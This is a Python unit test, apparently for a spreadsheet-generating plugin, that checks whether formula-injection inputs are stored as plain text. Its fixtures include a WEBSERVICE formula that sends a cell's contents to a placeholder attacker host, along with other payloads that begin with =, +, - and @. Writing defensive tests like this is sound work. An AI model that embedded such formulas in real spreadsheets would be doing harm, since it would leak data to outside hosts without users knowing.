import importlib.util
import json
import os
import unittest
from pathlib import Path
from tempfile import TemporaryDirectory

PLUGIN = Path(__file__).resolve().parents[1] / "hermeshq" / "plugin_templates" / "hermeshq_xlsx" / "__init__.py"


class TestInyeccionDeFormulas(unittest.TestCase):
    def setUp(self):
        spec = importlib.util.spec_from_file_location("xlsx_plugin_inyeccion", PLUGIN)
        self.plugin = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(self.plugin)
        self._tmp = TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        previo = os.environ.get("HERMES_SESSION_CWD")
        os.environ["HERMES_SESSION_CWD"] = self._tmp.name
        self.addCleanup(
            lambda: (
                os.environ.__setitem__("HERMES_SESSION_CWD", previo)
                if previo
                else os.environ.pop("HERMES_SESSION_CWD", None)
            )
        )

    def test_texto_con_formula_queda_como_texto(self):
        from openpyxl import load_workbook

        resultado = json.loads(
            self.plugin._handle_generate_xlsx(
                {
                    "title": "Inyeccion",
                    "filename": "inyeccion.xlsx",
                    "sheets": [
                        {
                            "name": "Datos",
                            "headers": ['=HYPERLINK("https://x")', "normal"],
                            "rows": [['=WEBSERVICE("https://atacante.example/?d="&A2)', "+1+1"], ["@SUM(1)", "-2"]],
                        }
                    ],
                }
            )
        )
        self.assertTrue(resultado["success"], resultado)
        ruta = Path(resultado["path"])
        hoja = load_workbook(ruta).active
        for celda in ("A1", "A2", "B2", "A3", "B3"):
            self.assertEqual(hoja[celda].data_type, "s", f"{celda} sigue siendo fórmula: {hoja[celda].value!r}")
        self.assertTrue(hoja["A2"].value.startswith("="))
        self.assertEqual(hoja["B2"].value, "+1+1")


if __name__ == "__main__":
    unittest.main()
